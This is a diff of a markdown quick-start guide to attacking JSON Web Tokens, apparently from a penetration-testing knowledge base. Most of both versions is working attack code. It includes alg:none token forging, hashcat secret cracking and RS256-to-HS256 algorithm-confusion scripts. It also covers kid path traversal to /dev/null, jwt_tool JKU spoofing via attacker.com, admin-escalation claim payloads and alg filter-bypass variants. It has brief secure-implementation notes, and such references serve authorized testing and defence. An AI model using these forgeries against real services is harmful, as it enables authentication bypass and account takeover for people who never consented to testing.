@@ -1,426 +1,196 @@
-# JWT Attacks - Quick-Start Guide
+# JWT — Quick Start
 
-Fast reference for JWT vulnerability testing and exploitation. Get from zero to compromise in minutes.
+Quick-reference card. Per-technique scenarios in `scenarios/jwt/`. See `authentication-principles.md` for decision tree.
 
----
-
-## 30-Second JWT Test
+## 30-second smoke test
 
 ```bash
-# 1. Capture JWT from login
-TOKEN="eyJhbGci..."
+# 1. Decode token
+echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq
 
-# 2. Test signature verification
-echo $TOKEN | sed 's/\.[^.]*$/\.INVALID_SIGNATURE/' | curl -H "Authorization: Bearer $(cat -)" https://target.com/api
+# 2. Try alg:none
+python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"
 
-# 3. Test none algorithm
-python3 jwt_tool.py $TOKEN -X a
+# 3. Crack weak secret
+hashcat -m 16500 jwt.txt jwt.secrets.list
 
-# 4. Crack weak secret (5 min)
-hashcat -a 0 -m 16500 token.txt jwt.secrets.list
+# 4. Algorithm confusion (RS256→HS256)
+curl /.well-known/jwks.json
+# → derive PEM, sign HS256 with PEM as secret
 ```
 
-**If any test succeeds → Full authentication bypass possible**
-
----
-
-## Lab Completion Times
-
-| Lab | Difficulty | Time | Key Technique |
-|-----|-----------|------|---------------|
-| 1. Unverified Signature | Apprentice | **1 min** | Modify payload, keep signature |
-| 2. None Algorithm | Apprentice | **2 min** | alg=none, remove signature |
-| 3. Weak Secret | Practitioner | **5 min** | hashcat brute force |
-| 4. JWK Injection | Practitioner | **3 min** | Embed public key |
-| 5. JKU Injection | Practitioner | **4 min** | External key fetch |
-| 6. Kid Traversal | Practitioner | **3 min** | /dev/null path |
-| 7. Algorithm Confusion | Practitioner | **5 min** | RS256→HS256 |
-
-**Total: 23 minutes for all 7 labs**
-
----
-
-## Quick Attack Decision Tree
+## Decision tree
 
 ```
-JWT received
-    │
-    ├─→ Can modify without re-signing? → Lab 1 (1 min)
-    │
-    ├─→ Accepts alg=none? → Lab 2 (2 min)
-    │
-    ├─→ Weak HMAC secret? → Lab 3 (5 min)
-    │   └─→ hashcat -m 16500
-    │
-    ├─→ Has jwk parameter? → Lab 4 (3 min)
-    │   └─→ Embed own public key
-    │
-    ├─→ Has jku parameter? → Lab 5 (4 min)
-    │   └─→ Point to attacker server
-    │
-    ├─→ Has kid parameter? → Lab 6 (3 min)
-    │   └─→ ../../../dev/null
-    │
-    ├─→ RS256 with public key? → Lab 7 (5 min)
-    │   └─→ Convert to HS256
-    │
-    └─→ Token has 5 parts (JWE)? → Nested token attack (5 min)
-        └─→ Craft PlainJWT (alg:none) + wrap in JWE with server's pub key
+Decode the token. Look at "alg":
+├── "none"            → scenarios/jwt/none-algorithm.md
+├── "HS256/384/512"   → scenarios/jwt/weak-secret-crack.md
+├── "RS256/384/512"   → scenarios/jwt/alg-confusion.md (with public JWKS)
+│                     → scenarios/jwt/jwk-injection.md (if jwk header trusted)
+│                     → scenarios/jwt/jku-injection.md (if jku header trusted)
+└── "ES256/384/512"   → scenarios/jwt/psychic-signatures-cve-2022-21449.md
+
+Look for header parameters:
+├── kid               → scenarios/jwt/kid-path-traversal.md
+├── x5u / x5c         → scenarios/jwt/x5u-x5c-injection.md
+└── jku / jwk         → see above
+
+Token has 5 parts (JWE)?
+└── scenarios/jwt/jwe-nested-token.md
+
+Have working forgery?
+└── scenarios/jwt/claim-tampering.md (modify sub/role/exp/tenant)
 ```
 
----
+## One-liner exploits
 
-## Rapid Testing Methodology
-
-### Phase 1: Initial Recon (30 seconds)
+### alg:none
 
 ```bash
-# Decode JWT
-echo "eyJ..." | cut -d. -f1-2 | while IFS=. read h p; do
-    echo $h | base64 -d 2>/dev/null | jq
-    echo $p | base64 -d 2>/dev/null | jq
-done
-
-# Look for:
-# - alg: Algorithm type
-# - kid: Key ID (path traversal?)
-# - jwk: Embedded key
-# - jku: Key URL
-# - 5 dot-separated parts = JWE (encrypted token) → try nested token attack
-
-# Enumerate JWKS endpoints (for alg confusion AND JWE attacks)
-for path in /.well-known/jwks.json /api/auth/jwks /oauth/jwks /auth/jwks.json /keys /certs; do
-    curl -s "https://target${path}" | jq . 2>/dev/null && echo "JWKS found at: ${path}"
-done
+H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+P=$(echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+echo "$H.$P."
 ```
 
-### Phase 2: Signature Test (1 minute)
-
-```python
-# Test 1: No verification
-import jwt
-token = "eyJ..."
-payload = jwt.decode(token, options={"verify_signature": False})
-# Modify payload
-malicious = jwt.encode(payload, "any-key", algorithm="HS256")
-# Test if accepted
-
-# Test 2: None algorithm
-header = '{"alg":"none","typ":"JWT"}'
-payload = '{"sub":"admin"}'
-import base64
-none_token = base64.b64encode(header.encode()).decode().rstrip('=') + '.' + \
-             base64.b64encode(payload.encode()).decode().rstrip('=') + '.'
-# Test none_token
-```
-
-### Phase 3: Secret Cracking (5 minutes max)
+### Crack HS256
 
 ```bash
-# Quick test with common secrets
-for secret in secret secret1 password admin; do
-    python3 -c "import jwt; jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])" 2>/dev/null && echo "Found: $secret" && break
-done
-
-# Automated cracking
-hashcat -a 0 -m 16500 token.txt jwt.secrets.list --force
-# Wait max 5 minutes, if not found → move on
+hashcat -m 16500 jwt.txt jwt.secrets.list
+hashcat -m 16500 jwt.txt rockyou.txt -r rules/best64.rule
 ```
 
-### Phase 4: Header Exploitation (2-3 minutes each)
+### Algorithm confusion
+
+```python
+from jwcrypto import jwk
+import jwt, requests
+jwks = requests.get('https://target/.well-known/jwks.json').json()
+key = jwk.JWK(**jwks['keys'][0])
+pem = key.export_to_pem()
+forged = jwt.encode({"sub":"admin"}, pem, algorithm='HS256',
+                     headers={"alg":"HS256","typ":"JWT"})
+```
+
+### kid path traversal
+
+```python
+import jwt, base64
+forged = jwt.encode({"sub":"admin"},
+                     base64.b64decode('AA=='),    # null byte
+                     algorithm='HS256',
+                     headers={"alg":"HS256","kid":"../../../../../../../dev/null"})
+```
+
+### Signature stripping
 
 ```bash
-# JWK injection
-python3 jwt_tool.py $TOKEN -X i
-
-# JKU injection
-python3 jwt_tool.py $TOKEN -X s -ju https://attacker.com/jwks.json
-
-# Kid traversal
-python3 jwt_tool.py $TOKEN -X k
+TOKEN="<original>"
+HEADER=$(echo $TOKEN | cut -d. -f1)
+NEW_PAYLOAD=$(echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+echo "$HEADER.$NEW_PAYLOAD."
 ```
 
----
+## Common payloads
 
-## One-Liner Exploits
-
-### Lab 1: Unverified Signature
-```python
-python3 -c "import jwt; print(jwt.encode({'sub':'administrator'}, 'ignored', algorithm='HS256'))"
-```
-
-### Lab 2: None Algorithm
-```bash
-echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '\n=' && echo -n '.' && echo '{"sub":"administrator"}' | base64 | tr -d '\n=' && echo '.'
-```
-
-### Lab 3: Weak Secret
-```bash
-hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list --quiet && hashcat jwt.txt --show
-```
-
-### Lab 4: JWK Injection
-```python
-python3 jwt_tool.py eyJ... -X i -pc sub -pv administrator
-```
-
-### Lab 5: JKU Injection
-```python
-python3 jwt_tool.py eyJ... -X s -ju https://exploit-server.net/jwks.json -pc sub -pv administrator
-```
-
-### Lab 6: Kid Traversal
-```python
-python3 jwt_tool.py eyJ... -I -hc kid -hv "../../../../../../../dev/null" -pc sub -pv administrator -S
-```
-
-### Lab 7: Algorithm Confusion
-```python
-python3 jwt_tool.py eyJ... -X k -pk public.pem -pc sub -pv administrator
-```
-
----
-
-## Essential Burp Suite Workflow
-
-### Setup (1 minute)
-1. Install JWT Editor extension
-2. Capture login request
-3. Send to Repeater
-
-### Exploitation (2-3 minutes per attack)
-
-**Test 1: Modify Claims**
-```
-1. JSON Web Token tab → modify payload
-2. Don't re-sign
-3. Send → check response
-```
-
-**Test 2: None Algorithm**
-```
-1. JSON Web Token tab → Header
-2. Change alg to "none"
-3. Remove signature (keep trailing dot)
-4. Send
-```
-
-**Test 3: Weak Secret**
-```
-1. Copy JWT to file
-2. Run hashcat
-3. If cracked → Sign with discovered secret
-```
-
-**Test 4: JWK Injection**
-```
-1. JWT Editor Keys → New RSA Key
-2. JSON Web Token tab → Attack → Embedded JWK
-3. Select generated key
-4. Send
-```
-
-**Test 5: Algorithm Confusion**
-```
-1. Fetch public key from /jwks.json
-2. JWT Editor Keys → New RSA Key → paste JWK
-3. Export as PEM → Base64 encode
-4. JWT Editor Keys → New Symmetric Key → paste encoded PEM as k
-5. Change alg to HS256
-6. Sign with symmetric key
-```
-
----
-
-## Common Payloads
-
-### Privilege Escalation Claims
+### Identity claims
 
 ```json
-{"sub": "administrator"}
-{"sub": "admin"}
-{"user": "admin"}
-{"username": "administrator"}
-{"role": "admin"}
-{"roles": ["admin", "superuser"]}
-{"is_admin": true}
-{"privilege": 100}
-{"permissions": ["all"]}
-{"scope": "admin:all"}
+{"sub":"admin","user_id":1,"username":"administrator","email":"admin@..."}
 ```
 
-### Temporal Bypass
+### Authorization claims
 
 ```json
-{"exp": 9999999999}
-{"exp": null}
-{"nbf": 0}
-{"iat": 0}
+{"role":"admin","roles":["admin"],"is_admin":true,"isAdmin":true,
+ "permissions":["*"],"scope":"admin:all"}
 ```
 
-### Path Traversal (kid)
-
-```
-../../../../../../../dev/null
-../../../../../../../etc/passwd
-../../../../../../../proc/version
-../../../../../../app/keys/public.key
-```
-
-### None Algorithm Variations
+### Temporal claims
 
 ```json
-{"alg": "none"}
-{"alg": "None"}
-{"alg": "NONE"}
-{"alg": "nOnE"}
+{"exp":9999999999,"iat":0,"nbf":0}
 ```
 
----
+### kid path traversal targets
 
-## Quick Tools Reference
+```
+../../../../../../../dev/null                       (sign with null byte)
+../../../../../../../etc/hostname                   (sign with hostname)
+../../../../../../../proc/sys/kernel/hostname
+../../../../../../app/config/public.key
+```
 
-### jwt_tool
+### alg filter-bypass variations
+
+```json
+{"alg":"None"}    {"alg":"NONE"}     {"alg":"nOnE"}
+{"alg":" none"}   {"alg":"none "}    {"alg":null}
+{"alg":""}        {"alg":["none"]}   {"alg":{"value":"none"}}
+```
+
+## jwt_tool reference
+
 ```bash
-# All attacks
-python3 jwt_tool.py JWT -M at
-
-# Specific attacks
--X a  # Algorithm confusion
--X i  # JWK injection
--X s  # JKU injection
--X k  # Kid injection
--C    # Crack secret
--T    # Tamper claims
+python3 jwt_tool.py JWT                                       # decode + display
+python3 jwt_tool.py JWT -M at -t "https://target/api"         # all attacks against URL
+python3 jwt_tool.py JWT -X a                                   # none algorithm
+python3 jwt_tool.py JWT -X i                                   # embedded JWK
+python3 jwt_tool.py JWT -X s -ju https://attacker.com/jwks.json # JKU spoofing
+python3 jwt_tool.py JWT -I -hc kid -hv "../../dev/null"        # kid injection
+python3 jwt_tool.py JWT -X k -pk public.pem                    # algorithm confusion
+python3 jwt_tool.py JWT -C -d wordlist.txt                     # crack secret
+python3 jwt_tool.py JWT -T -S hs256 -p "found_secret"          # forge with secret
 ```
 
-### hashcat
-```bash
-# HS256
-hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+## Hashcat modes
 
-# HS384
-hashcat -a 0 -m 16511 jwt.txt wordlist.txt
+| Mode | Algorithm |
+|---|---|
+| 16500 | JWT (HS256) |
+| 16511 | JWT (HS384) |
+| 16512 | JWT (HS512) |
 
-# HS512
-hashcat -a 0 -m 16512 jwt.txt wordlist.txt
+## Burp JWT Editor workflow
 
-# GPU optimization
-hashcat -a 0 -m 16500 jwt.txt wordlist.txt -w 3 -O
-```
+1. Repeater → JSON Web Token tab.
+2. Modify header / payload.
+3. Sign options:
+   - **none** — set alg=none, drop signature, trailing dot.
+   - **HS\*** — Keys tab → New Symmetric Key → `k = base64(secret)`.
+   - **RS\*** — Keys tab → New RSA Key → Sign.
+   - **Embedded JWK** — Attack → Embedded JWK → select key.
+4. Send.
 
-### Python Quick Scripts
+## Vulnerable signs
 
-**Test Signature Verification:**
-```python
-import jwt
-token = "eyJ..."
-try:
-    # Try decoding without secret
-    payload = jwt.decode(token, options={"verify_signature": False})
-    print("[+] Signature not verified! Vulnerable!")
-    print(payload)
-except:
-    print("[-] Signature verification enforced")
-```
+- `alg:none` or modified `alg` accepted.
+- Empty/null secret accepted.
+- Public key at `/.well-known/jwks.json` AND token uses RS256 → algorithm confusion possible.
+- `kid` reflects user input (path / SQL / shell).
+- `jku` URL honored from token header.
+- Signature missing or trailing dot accepted.
 
-**Create None Token:**
-```python
-import base64, json
+## Secure signs
 
-header = base64.urlsafe_b64encode(
-    json.dumps({"alg":"none","typ":"JWT"}).encode()
-).decode().rstrip('=')
+- Library uses explicit `algorithms=["RS256"]` allowlist.
+- `verify=True` mandatory.
+- JWKS endpoint pinned in config (not from token header).
+- `exp`, `nbf`, `iat`, `iss`, `aud` all validated.
+- Rotating signing keys with kid + JWKS lookup.
 
-payload = base64.urlsafe_b64encode(
-    json.dumps({"sub":"admin"}).encode()
-).decode().rstrip('=')
+## Time-saving tips & gotchas
 
-print(f"{header}.{payload}.")
-```
-
-**Crack Secret:**
-```python
-import jwt
-
-token = "eyJ..."
-wordlist = open('secrets.txt').read().splitlines()
-
-for secret in wordlist:
-    try:
-        jwt.decode(token, secret, algorithms=['HS256'])
-        print(f"[+] Found: {secret}")
-        break
-    except:
-        continue
-```
-
----
-
-## Success Indicators
-
-### Vulnerable Application Signs:
-- ✓ Modified claims accepted without re-signing
-- ✓ None algorithm not rejected
-- ✓ Default/weak secrets in use
-- ✓ Header parameters trusted
-- ✓ Algorithm mismatch accepted
-
-### Secure Implementation Signs:
-- ✗ Signature verification enforced
-- ✗ Algorithm whitelist enforced
-- ✗ Strong, random secrets
-- ✗ Header parameters validated
-- ✗ kid/jku/jwk parameters rejected
-
----
-
-## Common Mistakes to Avoid
-
-❌ **Forgetting trailing dot** in none algorithm
-✓ **Always**: `header.payload.`
-
-❌ **Wrong Base64 encoding** (standard vs URL-safe)
-✓ **Use**: URL-safe Base64 without padding
-
-❌ **Not checking "Don't modify header"** when signing
-✓ **Verify**: Header changes preserved
-
-❌ **Testing only one attack type**
-✓ **Try all**: Often multiple vulnerabilities present
-
-❌ **Giving up after failed secret crack**
-✓ **Move on**: Try header parameter attacks
-
----
-
-## Time-Saving Tips
-
-1. **Test signature verification first** (fastest to exploit)
-2. **Use jwt_tool automated mode** for quick scan
-3. **Pre-install Burp JWT Editor** before starting
-4. **Have wordlists ready** (jwt.secrets.list)
-5. **Script repetitive tasks** (Python one-liners)
-6. **Use Burp Repeater tabs** for parallel testing
-7. **Copy working payloads** to notes for reuse
-
----
+1. Always check `/.well-known/openid-configuration` first.
+2. Run `jwt_tool -M at` for full automated scan.
+3. Check JS bundles for hardcoded secrets: `curl /static/js/main.*.js | grep -iE 'secret|sign|HS256'`.
+4. Check git history: `git log -p | grep -iE 'jwt_secret|signing_key'`.
+5. .NET claim short-name for `ClaimTypes.Name` is `unique_name`.
+6. Trailing dot mandatory on alg:none tokens.
+7. Base64URL: replace `+`→`-`, `/`→`_`, strip `=`.
+8. `decode()` ≠ `verify()` — `decode(verify=False)` is the bug.
+9. `kid` must match JWKS kid for kid-based lookup.
 
 ## Resources
 
-**Attack Techniques**: `jwt_attack_techniques.md`
-**Security Resources**: `jwt_security_resources.md`
-
-**Tools**:
-- jwt_tool: https://github.com/ticarpi/jwt_tool
-- Burp JWT Editor: BApp Store
-- hashcat: https://hashcat.net/
-
-**Wordlists**:
-- jwt.secrets.list: https://github.com/wallarm/jwt-secrets
-- rockyou.txt: Standard pentesting wordlist
-
----
-
-**Remember**: All testing should be performed on authorized targets only. JWT vulnerabilities can lead to complete authentication bypass and system compromise.
-
+- `INDEX.md`, `scenarios/jwt/`, `jwt_security_resources.md`.
+- jwt.io, jwt_tool: https://github.com/ticarpi/jwt_tool
